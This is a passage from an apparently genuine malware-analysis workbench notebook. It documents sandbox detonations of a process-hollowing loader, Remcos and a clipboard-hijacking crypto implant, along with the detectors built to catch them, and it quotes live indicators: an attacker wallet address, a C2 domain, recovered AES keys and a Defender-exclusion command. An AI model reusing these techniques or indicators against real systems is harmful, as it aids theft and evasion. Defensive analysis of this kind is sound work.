  `683c76f3…` and `f08ba6d1…` appear in this file and are **not samples** —
  they are AES keys recovered from inside stage 2.

  **What survives is the derived work, and all of it stands.**
  `G:\ringforge-artifacts\422e30ed_stage2\` still holds stage 2, stage 3,
  the recovered stage 4, every emulator checkpoint and the proxy map, so the
  static and emulator results do not depend on re-acquiring anything.

- **Run everything on the host through `.venv`.** The global Python 3.12 is a
  partial install and silently disables YARA and psutil features. The guest's
  global Python is complete — do not add a venv there, since the GUI launches
  plain `python` and a mismatch reintroduces exactly that failure.
- **The guest needs a persistent default route** via the host-only gateway or
  FakeNet cannot intercept anything. It is in the current baseline. See the
  Hypervisor section of the README for why this does not break containment.
- **FakeNet does not restore the adapter's DNS on exit.** Between runs the guest
  points at itself with nothing listening, so DNS outside a run fails. Harmless
  during runs; confusing when testing by hand.
- **Hard power-offs corrupt git refs occasionally.** `-Take` powers the VM off
  hard by design. A broken `ORIG_HEAD` showed up once; deleting the file fixes
  it, and `git fsck` confirmed no other damage. The guest clone is disposable.
- **Defender's real-time protection and behaviour monitoring are off** in the
  baseline, and have been for every run. Checked on 05 Aug while investigating
  whether Defender was killing a payload — it was not.
- **Two guest settings are load-bearing and neither is a default.** Sysmon
  Event 25 (`ProcessTampering`) is commented out in SwiftOnSecurity's config,
  and Windows Error Reporting writes no memory image unless `LocalDumps` is
  configured. Without the first, process hollowing is invisible; without the
  second, a process that crashes leaves metadata and nothing else.
  `bootstrap_tools.ps1` now applies both, so a rebuilt VM comes up correct —
  before that they lived only in the baseline snapshot, and re-running the
  bootstrap would have silently reverted them.
- **A wedged VirtualBox session needs VBoxSVC restarted, and that takes every
  other VM with it.** VBoxManage returns when a state change is *queued*, not
  done. Issuing anything while the VM is in a transient state —
  `restoringsnapshot` is the usual one — can leave it stuck there with no
  process behind it, and no VBoxManage command clears it: `startvm` returns a
  bare `E_FAIL`. The way out is to save or stop every other running VM, close
  the Manager window, then `Stop-Process -Name VBoxSVC -Force`; it respawns on
  the next VBoxManage call and disk images are untouched. `vm_snapshot.ps1` now
  waits for the state to settle before each step, so the script no longer
  causes this — but a manual VBoxManage command still can.

---

## ARM A MISSED ITS TARGET AND HIT A BIGGER ONE — 24 Aug

Run `af2d83008fff89591cf33cdb_20260824_232310_972a3761`, 1,033 seconds, on the
freshly frozen `40e19f8` baseline. Designed to answer why `bait6` produced the
hardcoded wallet: serve the same 42-byte tracer `bait6` was served, to a *fresh*
payload, and see whether the clipboard receives the tracer or the wallet.

**It did not test that.** The tracer was never served, because the implant never
got a hostname to fetch it from.

### What actually happened

    23:23:11   bait starts, baiting 0xBA17...BA17
    23:26:14   first eth_call             handler_import_failed
    23:26:17   first substitution         0x0F14fc3bfAc3726172aCd08Fe4bFb79B633E76ff
    23:36:41   ninth eth_call             handler_import_failed
    23:38:10   bait ends

    851 rounds, 664 substituted, 3 clipboard errors
    every substitution identical: the hardcoded wallet

Nine `eth_call` connections over ten minutes, every one refused with
`execution reverted` by `_fallback_reply()`. No `getData()` answer, no hostname,
no beacon -- confirmed independently by the absence of `klopasnarhia.cc`
anywhere in `fakenet.log` and by zero recorded requests in the RPC jsonl.

**The bait was deliberately different from the served value this time**, which
`bait6` was not: `bait6` baited `0xC0FFEE…` *and* served `0xC0FFEE…`, so a
verbatim relay would have been indistinguishable from no substitution at all.
That arm was only readable because it happened to return a third value.

### What it establishes, and what it does not

**A fresh payload with no usable C2 answer substitutes with the hardcoded
wallet.** That is one clean observation and it kills the age hypothesis: `bait6`
was not about a payload having run for seven hours.

The mechanism it suggests fits all four observations to date:

    C2 state                clipboard receives      runs
    ────────────────────    ────────────────────    ──────────────────────
    answers with a body     that body, verbatim     bait5 (HTML), 24 Aug
    unreachable / errors    the hardcoded wallet    bait6, this run

**It is not proven.** This is a single observation of the *failure* branch, and
the pattern that keeps costing this bench days is exactly this: one observation
taken for the general rule. The success branch has two runs behind it; the
failure branch now has two, and one of them was an accident.

**And the `bait6` explanation is an inference, not a reading.** `bait6` ran at
21:49 against a payload that spawned at 14:03, by which time that run's FakeNet
had almost certainly stopped -- orphaning the payload from its C2, the same
condition as here. **That is checkable and has not been checked**: whether
FakeNet was still up at 21:49 is in that run's logs.

### Two bench defects, and the second is the familiar one

**1. `RINGFORGE_REPO_ROOT` was wrong by one path segment.** It read
`C:\projects\RingForge_Analyzer`; the repo is
`C:\projects\RingForge_Analyzer\ringforge-workbench`. The handler could not
import `dynamic_analysis.jsonrpc_responder`, so it never built a recorder and
never built an `AnswerPlanner` -- phase 2 could not have been armed even with
`RINGFORGE_RPC_ANSWER=1` set. `make_fakenet_config.py` prints the correct value,
derived from its own location; use its output rather than editing by hand.

**2. The run reported cleanly while a collector was dead.** Nine
`handler_import_failed` records, and `dynamic_run_summary.json` carried
`warnings: (none)` and a verdict of `Likely Malicious` on three strong
categories. The RPC responder failed completely, left evidence in its own log,
and nothing surfaced it in the run summary.

That is the principle this bench spent 24 Aug applying everywhere else --
*a collector that cannot run must say so* -- not yet applied to the RPC
responder. `_fallback_reply` is documented as keeping a failed import from
"silently becoming a different experiment"; it keeps the *implant's* experience
identical, and that is precisely what makes the failure invisible from the
report. The run summary should carry the import failure as a degraded-collection
warning.

### The corrected run

Both variables, set for the FakeNet process, and verified in the RPC log rather
than assumed:

    RINGFORGE_REPO_ROOT=C:\projects\RingForge_Analyzer\ringforge-workbench
    RINGFORGE_RPC_ANSWER=1

The check that it armed is one line: the RPC jsonl should contain recorded
requests, not `handler_import_failed`. If it does not, stop -- the run is
measuring the failure branch again.

### The guest predates the unified scoring model

This run reported `score_model: dynamic-corroboration-v3` and emitted no
`categories` array, because the baseline is frozen at `40e19f8` and every
scoring commit from `168302c` onward is host-only.

`docs/ROADMAP.md` claimed this run would be the first real case through
`corroboration-v1`. It could not be. **Nothing has exercised the unified model
on real data yet**, and doing so needs a guest pull and another baseline re-take
first. That is now the blocking dependency on that item.

---

## Known gaps, ranked

### 1. CLOSED — persistence and dropped files, 06 Aug

All four paths on this list have now fired on real malware. Kept because how it
closed is the most instructive thing in this document.

- **PowerShell script blocks** (05 Aug). The loader spawned `powershell.exe`
  with `Add-MpPreference -ExclusionPath <its own path>`: 12 blocks captured, 1
  suspicious, behaviour `Defender modification`, mapped to `T1562.001`.
- **Process injection** (05 Aug), via a route that did not exist before — gap 2.
- **Persistence** (06 Aug). Remcos `aa4d6427…` wrote `TRY150-6P1GV6` to the Run
  key in both HKCU and HKLM\Wow6432Node. `persistence_installed` **strong**.
- **Dropped files** (06 Aug). The same run dropped
  `%APPDATA%\Roaming\Config\smng.exe`, a PE, flagged by 18/24 vendors.

**The `0` was never a property of the samples.** Two of them were, and then a
detonation that should have produced both still reported nothing, because the
user-writable path markers could not match any real Windows path — see *The
dead-marker bug*. The pipeline had been discarding every file write and every
file create for the life of the project.

That is the pattern to distrust: a count that has never moved is evidence about
the detector at least as often as it is evidence about the samples. It was said
in this section, about this gap, before it turned out to be true of this gap —
the analyzer-attribution filter had already cost findings on every run for the
same reason.

Choosing the sample deliberately is what made it findable. The guest is
contained, so a downloader stalls at its first fetch and its dropped-file path
stays cold; Remcos was picked because it carries everything it needs and
installs before its first beacon, and its expected results were written down
*before* the run. Four of those expectations held and three failed, and all
three failures were pipeline bugs.

### 2. Injection detection had a hole the shape of the commonest technique

Sysmon Event 8 is `CreateRemoteThread`, and process hollowing does not raise it
— `NtUnmapViewOfSection`, `WriteProcessMemory` and `SetThreadContext` raise
nothing. So `injection_events: 0` was partly a statement about the detector
rather than about the samples.

Two detectors were added rather than one, and it is as well:

- Sysmon **Event 25** (`ProcessTampering`), the purpose-built hollowing event,
  now enabled by `bootstrap_tools.ps1`. **It did not fire** on the 05 Aug run
  despite being enabled and confirmed active in the live config, so it does not
  catch this technique.
- **Application Error 1000 with a faulting module of `unknown`**, meaning the
  fault address belongs to no loaded image. This one carried the finding alone.

**`unknown` is weaker than it looks.** JIT-compiled code also lives in private
allocations with no module mapped, so an ordinary .NET application faulting in
its own JITted code produces the same record. The 05 Aug fault was at
`0x011b2c7c`, outside the 57 KB payload image carved from the dump, so it may
well have been JITted code from the injected assembly rather than the assembly
itself. The category is therefore `present` for any such crash and `strong`
only when the process is one loaders hollow — `RegSvcs`, `RegAsm`,
`InstallUtil`, `MSBuild` and friends. Nothing legitimate starts `RegSvcs.exe`
and has it fault in anonymous memory.

### 3. CLOSED — the spawn dump fired too early; the re-dump is proven

The watcher dumps a new descendant the moment it appears, which is before
hollowing completes. Across three runs, every `RegSvcs` image is ~15 MB of
empty shell, and the payload was only ever captured by the crash dump — an
artifact that exists only because that payload happened to crash.

Fixed offsets cannot cover this: observed dormancy was +20s, +24s and +42s for
the same binary, so an offset tuned to one run misses the next.

**A second dump per child now fires at spawn + 10s**, measured from that
child's own first sighting rather than from launch, which is what makes it a
property of the technique instead of of the sample's dormancy. Trigger
`spawn-redump`, filename suffix `_redump`, `memory_dump_spawn_redump_seconds`
in the run summary, and a spinbox next to Max processes in the GUI. `0` turns
it off.

The pairing is the point: the spawn dump is the child before the loader touched
it and the re-dump is the same PID after, so a payload is visible as a
difference between two images rather than having to be recognised in one.

**Proven on four Remcos runs**, firing every time — child first seen at t1–t2,
re-dumped at t11–t12. It has not yet *revealed* anything, because Remcos drops
and executes rather than hollowing: `smng.exe` is already the payload at t1, so
the before/after pair is identical. The mechanism works; the case it was built
for still wants a sample that hollows a legitimate binary — see gap 5.

Three things still worth knowing:

- **10s is an estimate, not a measurement.** Hollowing completes in well under
  a second, so anything past ~1s has the payload; the pressure the other way is
  that a faulting payload takes the process with it. If the skipped list says
  `exited before its +10s re-dump`, lower it.
- **The process cap went 12 → 20**, because the cap counts dumps rather than
  processes and re-dumps are taken last — a cap that binds drops precisely the
  image this exists to collect.
- **A re-dump still owed when the watcher stops is recorded**, and the reason
  distinguishes the two cases: `exited before` means the delay wants lowering,
  `observation ended before` means the window was too short and the process may
  still have been holding the payload at teardown.

**The sample's own process has never been dumped**, on any Remcos run. It exits
at ~t1 and the earliest offset tried was +2s; the skip record says so every
time. `1, 25` is the only remaining option if an image of the packer is wanted.

**On the loader, `1, 25` worked — and produced the before/after pair this feature
was built for, on the root instead of on a child.** The 20:23 run of 06 Aug dumped
pid 2448 twice: at t1, **12 MB**, 12 modules, 103 regions, `unmapped: 0`; at t25,
**123 MB**, 66 modules, 572 regions, `unmapped: 1` — and that one image is the
payload. The packer is caught before it unpacked and after, and the difference
between the two images is the payload appearing. Nothing was inferred from a
single dump.

That is worth reading against the re-dump's own record on the same run, which
fired nothing: all three children were skipped `exited before its +3s re-dump`,
and `RegSvcs` 4264 lived **2.14s** (spawned 4:25:33.44, WerFault at 4:25:35.58).
3s is still too late for this sample. **The lesson is that the pairing matters
more than the mechanism**: a scheduled offset on the parent got it where a
spawn-relative delay on the child could not, because the parent is the process
that lives long enough to be photographed twice.

### 4. FIRST PIECE BUILT — the chain-crashed warning, 06 Aug

The gap asked for something narrow and honest: nothing reported "the sample's
chain ended by crash", and a deliberate anti-analysis bail is indistinguishable
from a broken payload *from outside the guest*. Both leave a crashed process and
an otherwise quiet run. The pipeline cannot tell them apart, and the fix does
not pretend to.

What it does instead is refuse to let a crashed chain read as a clean one.
`summarize_abnormal_termination` (in `crash_evidence`) fires on either of two
witnesses:

- the Application Error 1000 events already attributed to the sample; and
- any `WerFault.exe` whose `-p <pid>` names a sample-tree process — the loader's
  `RegSvcs.exe -> WerFault.exe`, previously in `spawned_processes` and unused.

The second exists because a Windows build can fail to write the event, leaving
only the WerFault spawn; `witnessed_only_by_werfault` marks that case. It is
**not scored** — a crash is not evidence of malice, benign software crashes — so
it renders as a `card-alert` warning above the evidence, the same shape as the
observation-window caution: *treat an otherwise-empty run as inconclusive rather
than clean.*

Verified end to end against the loader's real tree: both witnesses agree, the
warning names `RegSvcs.exe (pid 9592)`, and it sits above the verdict.

### 4b. COLLECTION PATH BUILT — registry reads, 06 Aug

The *active* half of gap 4 — the sample reading a VM artifact and then going
quiet — needed registry reads in the event stream first. That collection path now
exists. The detector on top of it does not, deliberately: nothing about this is
scored, and it has not run live.

**The blocker was not where the gap said it was.** `INTERESTING_OPS` capturing
only Create/Set/Delete was true and was the smaller half.
`tools/procmon-configs/dynamic_default.pmc` carries **sixteen Operation *include*
rules** and `DestructiveFilter` is **1**, so a `RegQueryValue` is dropped at
capture time, never reaches `export.csv`, and is not in the PML either. Every
capture this project has written is missing them — a second export pass over an
old `raw.pml` recovers nothing. Procmon ANDs include rules across columns, so
scoping reads to VM paths at capture time is not expressible: adding Path
includes would drop every file, process and network event whose path did not
match. So the reads are captured unscoped and narrowed in the parser.

**`tools/procmon-configs/dynamic_registry_reads.pmc`** is the default config plus
`RegQueryValue` and `RegOpenKey`, generated by `dynamic_analysis/procmon_config.py`
rather than clicked together in Procmon's GUI — a `.pmc` is a binary blob with no
diff, and the two configs now differ by a line of code. The module reads and
rewrites the `FilterRules` entry; the round trip is byte-exact and tested, which
is the only cheap evidence that the format model is right. Whether Procmon loads
the result is a guest test and has not been done.

**It is opt-in, and the reason is volume.** Registry reads are the
highest-count operation on Windows. The 1148-second UPX run is the warning: 113k
events took 548s of teardown, and all of it was parsing. Pick this config
deliberately. A run whose *only* question is the VM check can be short — the
checks happen in the first seconds — but do not shorten a run that also wants
behaviour, because dormancy has reached +60s on the loader; pay the volume cost in
teardown instead. `RegEnumKey`/`RegEnumValue` are left out: they cost the most and
no common check needs them. The parser classifies them anyway, so a config that
does capture them still works.

**`dynamic_analysis/vm_artifact_reads.py`** is the pass. 50 markers over
VirtualBox, VMware, QEMU, Xen, Hyper-V, Parallels and Wine, plus firmware and
device identity. Attributed by lineage, off the *full* event stream. Three things
it does on purpose:

- **`specificity` splits `vm_specific` from `identity_surface`.** A
  guest-additions service key exists only on a VM, so reading it is an
  environment check and nothing else. `SystemBiosVersion` is where a VM check
  looks for "VBOX" *and* where an inventory agent looks for a BIOS version. A
  detector built on this must not treat them alike.
- **The result is half the finding.** `SUCCESS` on `…\Services\VBoxGuest` means
  the sample was told it is in a VM; `NAME NOT FOUND` means `vm_hygiene.ps1` held
  and the check came back clean. `BUFFER OVERFLOW` counts as found — it is the
  ordinary first half of a two-call value read, and reading it as a failure would
  report an artifact absent that the sample went on to read in full.
- **`collection_available` is the field to read first.** Zero artifacts read on a
  run that captured no reads is a statement about the config, not about the
  sample, and the report says so in those words instead of implying the sample
  did not look. Background reads by processes outside the tree are counted, not
  dropped: Windows enumerates every service key including the guest additions'.

`registry_read` is explicitly **never** a high-signal event. The fall-through in
`_is_high_signal_event` matches any suspicious path, so letting reads through
would put every process that so much as reads a Run key into
`suspicious_path_hits` — the same mistake as `registry_create` going from 5 to
140 when the service marker was repaired, at ten times the volume. Nothing
scored moves.

**Not mapped to ATT&CK, though T1497.001 is the obvious technique.** The mapping
is descriptive and computed after scoring, so it would be safe — but naming an
adversary technique off a detector whose false-positive rate has never been
measured on a live run is the thing this project keeps learning not to do. Map it
after a run shows what it fires on.

**The guard is proven and the finding path is not.** On 06 Aug 21:15 the pass ran
with no reads in the stream and refused to let that read as an answer about the
sample: `collection_available: false`, and the report saying **Registry Reads —
Not Collected** rather than a silent zero. That is the half of this worth having
first. What it has still never done is see a registry read.

**An earlier run meant to exercise this did not carry it at all.** The 20:23 detonation of
06 Aug was set up for it and tested none of it, because the guest was one commit
behind and the config field was still on the default. Two independent witnesses
in its own summary say so, and either alone would have been enough:

- **`vm_artifact_reads` is absent from `dynamic_run_summary.json`** while
  `abnormal_termination` is present — so the guest was at `9df8ec0`, the commit
  before the pass existed.
- **`procmon_summary` has no `registry_read` category, and `other` is 70 events
  out of 106,343.** Had the reads been captured, the older parser would have put
  every one of them in `other` and it would have been in the hundreds of
  thousands. So the capture used `dynamic_default.pmc`.

Nothing about the collection path is proven or disproven by that run. **Check the
summary for the field before reading its absence as a result** — see the
convention on pipeline version below, which this is the first instance of.

**What is still not built** is the detector: "read a VM artifact, then went
quiet". It wants a live run first, and the loader `422e30ed…` is still the case —
if its `RegSvcs.exe` reads `…\Services\VBoxGuest` before it faults, that is the
first evidence either way about a crash that has now been deterministic for seven
runs. Run it with the guest at `a387991` or later, the Procmon config field
pointed at `dynamic_registry_reads.pmc`, and read
`procmon\vm_artifact_reads.json`.

### 5. Carver recovers payloads; the `strong` branch has still not fired

Carving the .NET assembly out of the crash dump on 05 Aug was done by hand:
find `MZ` headers, check `e_lfanew`, compare the timestamp against the host
image's. It took one small script and produced the single most informative
artifact of the whole investigation.

**`dynamic_analysis/pe_carve.py` now does it in the pipeline.** Every dump the
YARA pass scans is also searched structurally, and the images that no module
covers are written to `memory\carved\` as `.bin_` files — deliberately not an
extension a double-click runs.

The module list is what makes it precise. A minidump carries the process's own
loader data, so "a PE at an address no module covers" is answered from the
process's own record rather than by a heuristic. Four classifications, one of
which is evidence:

| | |
|---|---|
| `unmapped` | No module covers it and it carries code. **The finding.** |
| `resource_only` | Unmapped, no code. Fires constantly — see below. |
| `inside_module` | A second PE inside a module's range. Reported, not scored. |
| `at_module_base` | An ordinary loaded module. Counted and ignored. |

It feeds `process_injection` rather than adding a category. A hollow produces
the crash and the foreign image from one event, and a category that fires twice
for one behaviour is the volume-driven model the score design exists to avoid.
`strong` when the host is a binary loaders hollow, the same test the crash
evidence uses. **Its value is that it does not need the payload to crash** —
Event 25 is silent on this technique and the crash route only fires on a fault,
so a loader that hollows and runs cleanly was invisible to both.

**The false-positive class, found by running it against a real minidump.** An
idle Python process reported eleven unmapped PE images. All eleven were real:
two sections, `.rdata` and `.rsrc`, no code — MUI resource files, which Windows
maps with `LOAD_LIBRARY_AS_DATAFILE` and therefore never registers with the
loader. Not a parser bug; the images are genuinely there and genuinely
unmapped. It is a claim problem, and the same one as the analyzer-attribution
bug in reverse: **a signal that fires on every process on the machine says
nothing about any of them.** So the test is narrowed from "a PE" to "a PE that
could execute" — `SizeOfCode`, an entry point, or a section marked executable.
The count of what was set aside is kept and shown in the report.

The synthetic dumps in the test suite could never have shown this. They contain
only what the test author thought to put in them, which is the argument for
checking a new parser against something the operating system wrote.

**What it cannot do.** The classic overwrite-in-place hollow, where the payload
is written over the host image at its original base, classifies as
`at_module_base` and is invisible: the module list is read from the same memory
the payload now occupies, so there is nothing left to compare against. The
05 Aug sample mapped its payload *alongside* the real image, which is what made
it visible. This widens injection detection; it does not close it.

**`dynamic_analysis/module_integrity.py` closes it, 10 Aug.** Nothing is left to
compare against *in the dump* — but the file the module was loaded from is still
on disk, and a hollowed image differs from it wholesale. The pass compares every
loaded module's executable sections against its own file and reports
`identical` / `patched` / `replaced` / `no_reference`. It runs over the same
dumps the carver sees, straight after it, because the two answer opposite halves
of one question: beside the image, or over it.

Four things make it more than a diff, each of which would otherwise have sunk it:

- **Relocations are applied, not thresholded around.** A module loaded away from
  its preferred base differs at every fixup. `pefile.relocate_image` first makes
  the comparison exact, and "identical once relocated" is a far stronger claim
  than "mostly the same" — the slack in the weaker version is precisely where a
  hollow would hide.
- **Only executable sections.** `.data` changes the moment a process runs.
  Comparing it would flag every module and the signal would be worth nothing.
- **The reference must be the same build**, by `TimeDateStamp` and
  `SizeOfImage` — the carver's own fingerprint. A guest binary against the
  bench's copy of a different build differs for reasons that have nothing to do
  with the sample. **This is why the pass belongs on the guest**: there the
  references match, and on the bench most modules land in `no_reference`.
- **`no_reference` is counted, never skipped**, so a run where nothing could be
  compared reads as *could not tell* rather than as *nothing was modified* —
  `collection_available` in gap 4b, again.

**The thresholds are measured, not chosen.** Across 30 real system DLLs in a
minidump this host wrote — Bitdefender's user-mode hooks included — the
differing fraction of an untampered module tops out at **0.086%**. `patched`
starts at 0.1%, just above that floor; `replaced` at 25%, 250x above it. A test
asserts the floor stays under the threshold, so if the assumption ever stops
holding the suite says so rather than the detector quietly going blind.

**Validated against a dump the operating system wrote**, which is the standing
rule after the carver's eleven MUI resource files survived every synthetic
fixture: `make_reference_dump.py` calls `MiniDumpWriteDump` on the test process.
30 identical, 1 patched, 0 replaced, all relocated. The positive case is
**synthetic** — a module's mapped `.text` overwritten inside a copy of that dump
— so it tests the comparison, not any claim about real malware. Marked `slow`;
`pytest -m "not slow"` keeps the fast loop at 1.6s.

**Pre-registered prediction for the next run of `422e30ed…`,** written before it
happens, because that is what made gap 1 findable. Gap 5 currently reads
overwrite-in-place as the better-supported explanation, *deduced* from
`unmapped: 0` on every `RegSvcs` image. This tests it directly:

| `RegSvcs.exe` reads | Means |
|---|---|
| `replaced`, `replaced_in_hollowing_target: 1` | Overwrite-in-place confirmed; the gap 5 revision is right and the pass fired on real malware first time out |
| `identical` | The payload is **not** overwriting the host image, and the revision needs revising again — the more interesting result |
| `no_reference` | The guest has no matching build on hand; a wiring problem, not an answer |

**Not in the HTML report yet.** The summary carries `module_integrity_summary`
and `memory\module_integrity.json` holds the detail; read the JSON. Nothing is
scored off it until a live run shows what it fires on — the same discipline as
not mapping gap 4b to ATT&CK before measuring its false-positive rate.

### The run: `3f70058b`, 10 Aug — and the answer was none of the three

The pass ran on the guest (568 modules across 11 dumps, `available: true`), the
sample crashed as always, verdict 70 / Elevated Attention with
`process_injection` **strong**. The prediction above offered three outcomes for
`RegSvcs.exe`. **It produced a fourth: the module that mattered was skipped by
my own identity check**, and the summary counted the skip without naming it, so
the report could not say so.

**What is actually in that process.** Two module entries, same claimed path,
one `RegSvcs.exe`:

| base | verdict | |
|---|---|---|
| `0x00ed0000` | `identical` | 25,420 bytes of `.text`, **one byte** differing after relocation — the real image, ASLR'd, untouched |
| `0x00400000` | `no_reference` | the 32-bit preferred base. Its `TimeDateStamp`/`SizeOfImage` do not match the real `RegSvcs.exe`, so nothing was compared |

In that dump 10 of 11 modules fingerprint-matched cleanly. The one that did not
is an image at `0x400000` claiming to be RegSvcs and demonstrably not being it.

**So overwrite-in-place is wrong, and this is the second revision of gap 5.**
The real image is byte-identical to its file — nothing was written over it. What
is present is a *second* image at the preferred base, carrying a module-list
entry. That is why `unmapped_in_hollowing_target` has always read 0: the carver
classifies it `at_module_base` and skips it by design, and the identity gate
skipped it here. **Neither miss was a bug in the run. Both were design
decisions**, made for good reasons, that happened to exclude the same object.

**`header_mismatch` is the fix.** A module whose file exists but whose recorded
identity disagrees with it is now compared anyway and reported by *identity*,
never by degree — a low differing fraction must not downgrade it to `identical`,
or a payload sharing most of its bytes with the file it impersonates files as
clean. The mapped image's own header is read and reported alongside, which
describes the payload without carving it. `no_reference` modules are now
**named**, not merely counted: counting made "could not tell" visible, naming
says *what* could not be told, and on the first live run the unnamed one was the
entire answer.

**A caveat the naming exposed.** In the WER crash dump, the 32-bit `ntdll`,
`kernel32` and `kernelbase` also read `no_reference` at the same bases where the
ProcDump image had them `identical`. The two writers record different module
fingerprints for the same loaded module, so a WER dump is weaker ground for this
pass. It does not touch the finding above, which rests on the ProcDump image
where everything else matched.

**This did not need another detonation, and that is the point of
`python -m dynamic_analysis.module_integrity <case>\memory`.** The dumps were
already on disk; re-detonating to re-ask a question of data you already hold is
absurd, and a detector that can only be exercised by a new run gets exercised
rarely.

### The injected payload is stage 3, confirmed byte for byte — 10 Aug

Re-running the fixed pass over `RegSvcs.exe_12080_t58.dmp` reports the image at
`0x400000` and reads its own header:

    regsvcs.exe @ 0x400000   (a process loaders hollow)
      loader says   timestamp 0x5ff2b99b  size_of_image 0x46000
      the file has  timestamp 0x68531ee1  size_of_image 0xe000
      in memory     entry 0x2680  image_base 0x400000  sections 1
      99.10% of the comparable bytes differ from the real RegSvcs

`entry 0x2680` and `SizeOfImage 0x46000` are what `emulate_native_stub.py` has
been driving all session — but those came from the *carved* file, so agreement
was not yet evidence. The bytes were compared instead:

**284,671 of 284,672 identical — 99.9996%.** The single differing byte is the
last one in the carve, a boundary artifact of the file-layout size.

**So the emulator has been running the real thing, at the real base, from the
real entry point**, and that is now measured rather than assumed. The chain is
closed end to end: stage 2 decrypts stage 3, and stage 3 is what ends up mapped
into the hollowed `RegSvcs`. Nine detonations had only ever inferred that.

**And the mechanism is finally named.** Not overwrite-in-place: the real
`RegSvcs.exe` sits relocated at `0x00ed0000`, byte-identical to its file, while
stage 3 occupies `RegSvcs.exe`'s *preferred* base `0x400000` and carries a
module-list entry claiming to be it. Every previous reading of this — "mapped
alongside", then "written over" — was wrong in a way no available evidence could
settle, because both detectors skipped the object.

**One caveat that matters for where this pass is run.** On the *bench* the same
dump yields **8** header mismatches, not one: the guest's system DLLs are
different builds from the host's, so `ntdll`, `wow64*` and friends fail the
identity check and get compared against the wrong file — `wow64base` reads 59%
differing and means nothing at all. On the guest those same modules read
`identical` and `regsvcs.exe @ 0x400000` was the **only** mismatch. *Read this
pass where the references match; off-guest it is a lead generator, not a
verdict.*

**A parsing bug the readout exposed:** `ImageBase` is the one header field that
moves between PE32 and PE32+, and reading the 32-bit layout on a 64-bit image
returns the top half of the address. It printed `0x7fff` for every 64-bit
module — plausible enough to skim past. Fixed by checking the optional-header
magic.

### Why it crashes, after nine detonations: a hardcoded pointer — 10 Aug

`c0000005`, reading `0x32dfd514`, at RVA `0x2c7c` of stage 3's relocated copy.
The instruction is `cmp al, byte ptr [esi+ecx]` inside the case-insensitive
marker search. Forty-one bytes of disassembly settle it:

    0x16054  test eax, eax
    0x16056  je   0x16069
    0x16058  mov  byte  [esi+0x138], 1
    0x1605f  mov  dword [esi+0x6d8], 0x32dfd514      <-- an immediate
    0x16069  push esi
    0x1606a  call 0x2cd91                            <-- the emulator's route
    0x1607a  je   0x16014                            <-- retry loop
    0x160ab  call 0x29101                            <-- the guest's route

**`0x32dfd514` is a literal in the code**, and it is the exact address the
process died on. Stored into the context at `[esi+0x6d8]`, later used as the
haystack base for the marker search. It is **not page-aligned** (`& 0xFFF ==
0x514`), so it was never an allocation base that failed to materialise — it is a
fixed absolute pointer that nothing maps, on any machine.

**"So the crash is a bug, not a reaction to us" — written here first, and it is
not supported.** The store at `0x1605f` is **conditional**. It runs only on the
non-zero branch of `test eax, eax` at `0x16054`, and the value being tested is
the return of `0x2dc01` — which is `get_module_base_by_hash`, already documented
in this file at `0x202ec01`: it walks `PEB->Ldr`, lowercases each `BaseDllName`,
CRC-32s it, and returns `DllBase` on a match or 0 at the end of the list.

So the sample writes that pointer **when a particular module is loaded**. A
program that poisons a pointer on detecting something is not a broken build; it
is a plausible crash-on-detection. Both readings now fit, and neither is
established. What *is* established is that the fault reads a constant that
appears as an immediate in the code, on a branch the emulator does not take.

**The emulator takes the other branch and lives.** Measured from the entry
point: `eax = 0` at `0x16054` at 17,299,166 blocks, the store is skipped, and it
then runs all four marker searches — `0x160a1`, `0x160ab`, `0x160b5`, `0x160bf`
— without faulting and exits cleanly. The blocks immediately before the branch
are `0x2dc7e → 0x2dc85 → 0x2dc8c`, which is that function's *walked the whole
list, found nothing, return 0* exit.

**And the obvious next inference does not close either.** The hash looked up
just before that branch is **`0xe11da208`** — the one this document already
records as matching nothing on this host after a 4,419-name sweep. But none of
the modules loaded in the crashed `RegSvcs` hash to it either:

| | |
|---|---|
| `regsvcs.exe` | `0xe2e77daf` |
| `ntdll.dll` | `0x0b4e1ae2` |
| `wow64.dll` / `base` / `win` / `con` / `cpu` | `0x80515ad9` / `0x42d73626` / `0xcbedd56f` / `0x4ef3b040` / `0x79069242` |
| `kernel32.dll` / `kernelbase.dll` | `0xadedab08` / `0x21094b62` |

So on the guest that same lookup should also have returned 0 and skipped the
store — yet the guest's context held the constant. Something does not line up,
and the candidates are: a module present at the check and gone by the crash; a
second store of the same value on a path the emulator never runs; or the
association between that lookup and that branch being wrong. **Reading the
minidump's unloaded-module list would discriminate, and two attempts at its
layout produced garbage — a count of 7.6 quintillion, then the process id.**
Loud failures, and the right point to stop guessing at structure layouts and
find a parser that is known good.

**The chain is proven by forging the lookup, 10 Aug.** *(The name was recovered
two days later — it is `sbiedll.dll`, and `RINGFORGE_FORGE_MODULE=1` now adds
that instead. The forgery below is what the causal test rested on at the time,
and it still stands on its own.)* The real name behind
`0xe11da208` was then unknown and no dictionary had matched it — but the name is not
needed to test causality, only the *hash*. CRC-32 is affine, so four bytes were
solved for over GF(2): **`aqtd9dq.dll`** hashes to `0xe11da208` and has no other
property. Added to the loader list behind `RINGFORGE_FORGE_MODULE=1`, which
prints a warning naming it as forged whenever it is on.

    17,304,968blk  rva 0x16056  branch on the lookup   eax=0x71400000
    17,304,969blk  rva 0x1605f  STORE [esi+0x6d8] = 0x32dfd514
    FAULT  addr 0x32dfd514  eip rva 0x02c53

`eax` is the forged module's `DllBase`, so the lookup succeeded, the store ran,
and the process died reading **the guest's exact faulting address**. The
emulator had run this same code to a clean `ExitProcess` on every previous
attempt.

So: **module present → poisoned pointer → crash**, demonstrated end to end. That
makes crash-on-detection much the better reading. A broken build crashes
regardless of what is loaded; this one crashes only when it finds something.

*The faulting instruction is rva `0x2c53`, not the guest's `0x2c7c`* — the same
compare routine, which reads the poisoned pointer from several paths depending
on the needle bytes, so which read faults first differs. The address matches
exactly and the instruction does not; worth stating rather than rounding to
"identical".

**The guest-side inventory arrived, and it cracked one hash and refuted two
hypotheses.** 931 loaded-module names from the guest, run against the three
values this project had never matched:

| | |
|---|---|
| `0x5c4ee455` | **`"wow64"`** — no extension, plain ascii |
| `0xe11da208` | no match, against all 931 |
| `0x79dbe71d` | no match |

**`"wow64"` is a lesson about the sweeps, not just an answer.** Every earlier
brute force in this document used *filenames*, with extensions. This hash is a
bare stem. Re-run the old sweeps with stems before concluding anything else is
unmatchable.

> **Wrong, and the correction is the more useful lesson.** It is not a stem, it
> is a **5-character substring** — the sample scans a lowercased string for a
> fixed-length run whose first character and length are pushed as immediates at
> the call site. Re-running the sweeps with stems was done and found nothing.
> See *`0x79dbe71d` is `"sychpe32"`*.

**It also exposed a real harness divergence, which then did not explain the
